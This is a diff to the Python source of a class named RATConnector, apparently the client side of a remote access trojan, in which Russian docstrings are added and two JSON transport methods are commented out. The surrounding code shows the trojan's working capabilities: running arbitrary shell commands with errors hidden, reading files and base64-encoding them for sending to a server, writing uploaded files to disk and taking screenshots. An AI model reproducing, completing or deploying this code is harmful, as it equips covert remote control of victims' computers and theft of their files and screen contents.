@@ -14,6 +14,7 @@ class RATConnector:
 
     # Отправляем json данные серверу
     def send_json(self, data):
+        """отправка данных серверу"""
         # Если данные окажутся строкой
         try:
             json_data = json.dumps(data.decode('utf-8'))
@@ -25,6 +26,7 @@ class RATConnector:
 
     # Получаем json данные от сервера
     def receive_json(self):
+        """получение данных от сервера"""
         json_data = ''
         while True:
             try:
@@ -46,47 +48,52 @@ class RATConnector:
             else:
                 break
 
-    # Function for sending data as JSON
-    def dataSend(self, data):
-        jsonData = json.dumps(data)
-        self.connection.send(jsonData.encode())
+    # # Function for sending data as JSON
+    # def dataSend(self, data):
+    #     jsonData = json.dumps(data)
+    #     self.connection.send(jsonData.encode())
 
-    # Function for receiving data as JSON
-    def dataReceive(self):
-        jsonData = b""
-        while True:
-            try:
-                jsonData += self.connection.recv(1024)
-                return json.loads(jsonData)
-            # If ValueError returned then more data needs to be sent
-            except ValueError:
-                continue
+    # # Function for receiving data as JSON
+    # def dataReceive(self):
+    #     jsonData = b""
+    #     while True:
+    #         try:
+    #             jsonData += self.connection.recv(1024)
+    #             return json.loads(jsonData)
+    #         # If ValueError returned then more data needs to be sent
+    #         except ValueError:
+    #             continue
 
     def arrayToString(self, s):
+        """переводит массив в строку"""
         convStr = ""
         for i in s:
             convStr += i
         return convStr
 
-    # Run any command on the system
+    # Запускает любую конанду в консоле
     def runCommand(self, command):
+        """запускает команду в консоле"""
         return subprocess.check_output(
             command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL
         )
 
     # Reading files with base 64 encryption for non UTF-8 compatability
     def readFile(self, path):
+        """читает файл с кодированием"""
         with open(path, "rb") as file:
             return base64.b64encode(file.read())
 
     # Writing files, decode the b64 from the above function
     def writeFile(self, path, content):
+        """Записывает файл с кодирование"""
         with open(path, "wb") as file:
             file.write(base64.b64decode(content))
             return "[+] Upload complete"
     
     # Обработать изображение с экрана
     def screen_handler(self):
+        """делает скриншот"""
         pyautogui.screenshot('1.png')
         with open('1.png', 'rb') as file:
             reader = base64.b64encode(file.read())
